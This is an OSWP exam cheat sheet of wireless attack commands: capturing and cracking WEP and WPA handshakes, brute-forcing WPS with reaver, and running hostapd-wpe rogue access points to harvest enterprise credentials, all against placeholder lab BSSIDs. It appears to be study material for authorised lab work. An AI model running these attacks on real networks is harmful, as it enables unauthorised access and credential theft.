---
title: OSWP
---

# OSWP

## Variables

```bash
export IFACE='wlan0'
export MON='wlan0mon'
export PCAP="$PWD/captures/target-01.cap"
mkdir -p captures
```

## Frames

| Filter | Traffic |
| --- | --- |
| `wlan.fc.type == 0` | Management |
| `wlan.fc.type_subtype == 8` | Beacon |
| `wlan.fc.type_subtype == 0x000c` | Deauthentication |
| `eapol` | EAPOL |
| `eap` | EAP |
| `tls.handshake.certificate` | Certificate exchange |

## Adapter

```bash
iw dev
iw phy
ethtool -i "$IFACE"
iw list | sed -n '/Supported interface modes:/,/Band/p'

sudo airmon-ng check kill
sudo airmon-ng start "$IFACE"
iw dev
```

## Discovery

```bash
sudo airodump-ng "$MON"

sudo airodump-ng --bssid 02:00:00:00:01:00 --channel 6 --write captures/target wlan0mon

tshark -r "$PCAP" -Y 'wlan.fc.type_subtype == 8 || wlan.fc.type_subtype == 11 || eapol'
```

Record BSSID, channel, client MAC, and signal level.

## WEP

```bash
sudo aireplay-ng --fakeauth 0 -a 02:00:00:00:01:00 wlan0mon

sudo aireplay-ng --arpreplay -b 02:00:00:00:01:00 wlan0mon

aircrack-ng -b 02:00:00:00:01:00 captures/target-01.cap
```

## WPA/WPA2

```bash
sudo airodump-ng --bssid 02:00:00:00:01:00 --channel 6 --write captures/wpa wlan0mon

tshark -r captures/wpa-01.cap -Y eapol
aircrack-ng captures/wpa-01.cap

hcxpcapngtool -o captures/wpa.22000 captures/wpa-01.cap

hashcat -m 22000 captures/wpa.22000 wordlists/lab.txt
```

## WPS

```bash
sudo wash -i wlan0mon

sudo reaver -i wlan0mon -b 02:00:00:00:01:00 -c 6 -d 5 -vv
```

## Enterprise

```bash
tshark -r captures/enterprise.pcapng -Y 'eap || tls.handshake.certificate'

sudo hostapd-wpe -t configs/hostapd-wpe.conf
sudo hostapd-wpe configs/hostapd-wpe.conf

sudo journalctl -f | grep -Ei 'hostapd|eap|radius'
```

Check the server certificate, EAP identity, negotiated method, and client validation.

## Cleanup

```bash
sudo airmon-ng stop "$MON"
sudo systemctl restart NetworkManager
iw dev
```

## References

- [PEN-210 course](https://www.offsec.com/courses/pen-210/)
